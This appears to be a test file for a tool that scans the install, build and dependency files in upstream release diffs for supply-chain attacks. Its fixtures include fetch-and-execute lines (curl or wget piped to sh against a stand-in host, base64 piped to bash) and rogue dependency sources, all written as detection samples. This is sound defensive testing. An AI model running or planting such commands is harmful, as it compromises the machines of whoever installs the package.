// Upstream taps (apply.upstreamTaps): the tap is the upstream source repo, so the review reads the
// supply-chain surface of the release diff, not every source file. A suspicious change in that
// surface still FLAGs; the existing gates (formula, origin, dependencies) stay in force.
import { afterAll, describe, expect, test } from "bun:test";
import { chmodSync, mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { formulaReview } from "../../src/apply/formula.ts";
import { isSurfaceFile, scanSurface } from "../../src/apply/surface.ts";
import { typeBReview, type TypeBOptions } from "../../src/apply/typeb.ts";
import { parseApplyConfig } from "../../src/apply/config.ts";
import { scripted } from "./helpers.ts";
import { APPROVE, cleanupFixtures, fixture, OFFICIAL, SOURCE, TAP, type Fx } from "./tap-fixture.ts";

afterAll(cleanupFixtures);

const put = (t: string, p: string, s: string) => {
  mkdirSync(join(t, p, ".."), { recursive: true });
  writeFileSync(join(t, p), s);
};
/** A release: lots of ordinary source changes plus whatever `extra` adds. */
const release = (extra: (t: string) => void = () => {}) => (t: string) => {
  put(t, "src/omlx/server.py", Array.from({ length: 300 }, (_, i) => `x_${i} = ${i}`).join("\n") + "\n");
  put(t, "src/omlx/engine.py", "def run():\n    return 1\n");
  put(t, "README.md", "# notes\n");
  put(t, "pyproject.toml", '[project]\nname = "omlx"\nversion = "1.1"\ndependencies = ["numpy>=1.26"]\n');
  extra(t);
};

async function review(f: Fx = {}, answers: string[] = [], upstream = true, fallback = APPROVE) {
  const fx = fixture({ oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1"), artifact: "source", ...f });
  const { r, prompts } = scripted(answers, fallback);
  const notices: string[] = [];
  const res = await formulaReview(fx.env, r, {
    pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "source", tapDir: fx.tap, head: fx.head,
    newUrl: SOURCE("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: (t) => void notices.push(t), upstream,
  });
  return { ...res, prompts, notices, fx };
}

describe("isSurfaceFile", () => {
  test("install, build, manifest, lockfile, CI and packaging paths are surface; plain source is not", () => {
    for (const p of ["Formula/omlx.rb", "setup.py", "pyproject.toml", "requirements-dev.txt", "uv.lock", "Cargo.lock", "package.json", "bun.lock", "Makefile", "CMakeLists.txt", "packaging/x.plist", "scripts/build.sh", ".github/workflows/release.yml", "install.sh", "apps/omlx-mac/build.sh", "Dockerfile", "MANIFEST.in"])
      expect(isSurfaceFile(p)).toBe(true);
    for (const p of ["src/omlx/server.py", "docs/guide.md", "tests/test_a.py", "apps/omlx-mac/Sources/App.swift"]) expect(isSurfaceFile(p)).toBe(false);
  });
});

describe("scanSurface", () => {
  test("a diff that adds nothing suspicious has no findings", () => {
    expect(scanSurface([{ path: "pyproject.toml", diff: '+version = "1.1"\n+dependencies = ["numpy>=1.26"]' }])).toEqual([]);
  });
  test("fetch-and-execute and obfuscation in a build file are findings", () => {
    expect(scanSurface([{ path: "setup.py", diff: '+os.system("curl http://x.test/a | sh")' }])).toHaveLength(1);
    expect(scanSurface([{ path: "scripts/build.sh", diff: "+echo aGk= | base64 -d | bash" }]).length).toBeGreaterThan(0);
  });
  test("a network fetch added to a build script is a finding, but not a CI workflow's curl", () => {
    expect(scanSurface([{ path: "Makefile", diff: "+\twget https://x.test/blob -O blob" }])).toHaveLength(1);
    expect(scanSurface([{ path: ".github/workflows/ci.yml", diff: "+      - run: curl -sSf https://x.test/lint" }])).toEqual([]);
  });
  test("a new dependency from a url, vcs or other index is a finding; a registry pin is not", () => {
    expect(scanSurface([{ path: "requirements.txt", diff: "+evil @ git+https://x.test/evil.git" }])).toHaveLength(1);
    expect(scanSurface([{ path: "requirements.txt", diff: "+--extra-index-url https://x.test/simple" }])).toHaveLength(1);
    expect(scanSurface([{ path: "package.json", diff: '+    "left": "https://x.test/left.tgz"' }])).toHaveLength(1);
    expect(scanSurface([{ path: "requirements.txt", diff: "+numpy==1.26.4" }])).toEqual([]);
  });
  test("removed lines are never findings", () => {
    expect(scanSurface([{ path: "setup.py", diff: '-os.system("curl http://x.test | sh")' }])).toEqual([]);
  });
});

describe("upstream formulaReview", () => {
  test("a benign release (hundreds of source lines, a version bump, a Makefile tweak) APPROVEs on the surface alone", async () => {
    const v = await review({ after: release((t) => put(t, "Makefile", "all:\n\tpython -m build\n")) });
    expect(v).toMatchObject({ rc: 0, calls: 1 });
    const p = v.prompts[0]!;
    expect(p).toContain("supply-chain surface");
    expect(p).toContain("pyproject.toml");
    expect(p).toContain("Makefile");
    expect(p).toContain("not shown");
    expect(p).not.toContain("x_299");
    expect(p).not.toContain("src/omlx/engine.py (status");
    expect(v.pin).toBeDefined();
  });
  test("a setup.py that starts fetching and running code is FLAGged before any reviewer call", async () => {
    const v = await review({ after: release((t) => put(t, "setup.py", 'import os\nos.system("curl http://x.test/p | sh")\n')) });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("upstream release surface — manual review: ");
    expect(v.reason).toContain("setup.py");
    expect(v.notices).toHaveLength(1);
  });
  test("a new dependency from a git url is FLAGged", async () => {
    const v = await review({ after: release((t) => put(t, "requirements.txt", "evil @ git+https://x.test/evil.git\n")) });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toContain("requirements.txt");
  });
  test("a new binary outside images is FLAGged; a real PNG is not; a .png that is not a PNG is FLAGged", async () => {
    const bin = await review({ after: release((t) => writeFileSync(join(t, "helper"), Buffer.from([0, 1, 2, 0, 255, 0, 7]))) });
    expect(bin).toMatchObject({ rc: 1, calls: 0 });
    expect(bin.reason).toContain("helper");
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0]);
    const img = await review({ after: release((t) => writeFileSync(join(t, "logo.png"), png)) });
    expect(img.rc).toBe(0);
    const fake = await review({ after: release((t) => writeFileSync(join(t, "logo.png"), Buffer.from([0, 1, 2, 0, 255]))) });
    expect(fake).toMatchObject({ rc: 1, calls: 0 });
    expect(fake.reason).toContain("logo.png: binary file added or changed");
  });
  test("a new executable script is read as surface wherever it is", async () => {
    const v = await review({ after: release((t) => { put(t, "tools/run", "#!/bin/sh\necho hi\n"); chmodSync(join(t, "tools/run"), 0o755); }) });
    expect(v.rc).toBe(0);
    expect(v.prompts[0]).toContain("tools/run");
    expect(v.prompts[0]).toContain("echo hi");
  });
  test("the reviewer still decides: a FLAG on a surface that passes the scan holds it", async () => {
    const v = await review({ after: release() }, ['FLAG\n1. FLAG: "dependencies" indicator 2']);
    expect(v).toMatchObject({ rc: 1, calls: 1 });
  });
  test("a formula change is still gated: the url moving to another repo FLAGs", async () => {
    const fx = fixture({ oldUrl: SOURCE("1.0"), newUrl: "https://github.com/evil/tool/archive/refs/tags/v1.1.tar.gz", artifact: "source", after: release() });
    const res = await formulaReview(fx.env, scripted([], APPROVE).r, {
      pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "source", tapDir: fx.tap, head: fx.head,
      newUrl: "https://github.com/evil/tool/archive/refs/tags/v1.1.tar.gz", officialTaps: OFFICIAL, host: "fixture", notify: () => {}, upstream: true,
    });
    expect(res.rc).toBe(1);
    expect(res.reason).toStartWith("source repo changed");
  });
  test("no release diff available (receipt has no revision) FLAGs: the surface cannot be established", async () => {
    const v = await review({ receipt: "none", after: release() });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toContain("release diff");
  });
  test("without the upstream flag the support-files FLAG is unchanged", async () => {
    const v = await review({ after: release() }, [], false);
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("tap support files changed — manual review: ");
  });
});

describe("typeBReview with upstreamTaps", () => {
  const o = (upstreamTaps?: string[]) => {
    const notices: string[] = [];
    const opts: TypeBOptions = { officialTaps: OFFICIAL, host: "fixture", notify: (t) => void notices.push(t), upstreamTaps };
    return { opts, notices };
  };
  const fx = () => fixture({ oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1"), after: release() });
  test("a listed tap's source-built release that passes the surface review installs (rc 0, pin, kind)", async () => {
    const f = fx();
    const v = await typeBReview(f.env, scripted([], APPROVE).r, "tool", TAP, o([TAP]).opts);
    expect(v).toMatchObject({ rc: 0, kind: "formula + release surface" });
    expect(v.pin).toEqual({ pkg: "tool", tapDir: f.tap, head: f.head, rbPath: "Formula/tool.rb" });
  });
  test("an unlisted tap, or no config, is exactly as before: held", async () => {
    for (const up of [undefined, [], ["other/tap"]]) {
      const v = await typeBReview(fx().env, scripted([], APPROVE).r, "tool", TAP, o(up).opts);
      expect(v.rc).toBe(1);
    }
  });
  test("a listed tap with a malicious surface change is held", async () => {
    const f = fixture({ oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1"), after: release((t) => put(t, "setup.py", 'os.system("wget http://x.test/p -O- | sh")\n')) });
    const v = await typeBReview(f.env, scripted([], APPROVE).r, "tool", TAP, o([TAP]).opts);
    expect(v.rc).toBe(1);
    expect(v.pin).toBeUndefined();
  });
  test("a listed tap whose release is still a prebuilt download keeps the formula-only path", async () => {
    const v = await typeBReview(fixture().env, scripted([], APPROVE).r, "tool", TAP, o([TAP]).opts);
    expect(v).toMatchObject({ rc: 0, kind: "formula-only, prebuilt" });
  });
});

describe("upstreamTaps config", () => {
  test("off by default; lowercased when given; must be a list", () => {
    expect(parseApplyConfig(JSON.stringify({ apply: { stateDir: "/s.test" } }), "h").upstreamTaps).toEqual([]);
    expect(parseApplyConfig(JSON.stringify({ apply: { stateDir: "/s.test", upstreamTaps: ["Jundot/OMLX"] } }), "h").upstreamTaps).toEqual(["jundot/omlx"]);
    expect(() => parseApplyConfig(JSON.stringify({ apply: { stateDir: "/s.test", upstreamTaps: "jundot/omlx" } }), "h")).toThrow();
  });
});
